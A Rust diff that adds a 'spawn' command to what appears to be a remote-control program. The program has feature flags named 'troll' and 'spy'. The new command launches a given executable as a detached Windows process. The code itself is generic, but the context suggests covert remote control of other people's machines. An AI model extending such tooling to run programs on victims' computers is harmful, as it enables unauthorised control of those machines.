@@ -13,6 +13,11 @@ use base64::decode;
 #[cfg(feature = "troll")]
 use rodio::{ OutputStream, source::Source };
 
+#[cfg(feature = "control")]
+use std::process::Command;
+#[cfg(feature = "control")]
+use std::os::windows::process::CommandExt;
+
 #[cfg(feature = "spy")]
 use serde::Deserialize;
 #[cfg(feature = "spy")]
@@ -381,4 +386,29 @@ pub fn opencmd(args: Args, out: OutFun) {
         return;
     }
     text_output!(out, format!("Opened path: {}", path));
+}
+#[cfg(feature = "control")]
+pub fn spawn(args: Args, out: OutFun) {
+    match args.len() {
+        len if len < 1 => {
+            text_output!(out, "Please provide an executable to spawn.".to_string());
+        }
+        _ => {
+            let executable = args[0].clone();
+            std::thread::spawn(move || {
+                match
+                    Command::new(executable)
+                        .creation_flags(0x00000008) // DETACHED_PROCESS (windows specific)
+                        .spawn()
+                {
+                    Ok(_) => {
+                        text_output!(out, "Child process started successfully.".to_string());
+                    }
+                    Err(err) => {
+                        text_output!(out, format!("Failed to start process: {:?}", err));
+                    }
+                }
+            });
+        }
+    }
 }
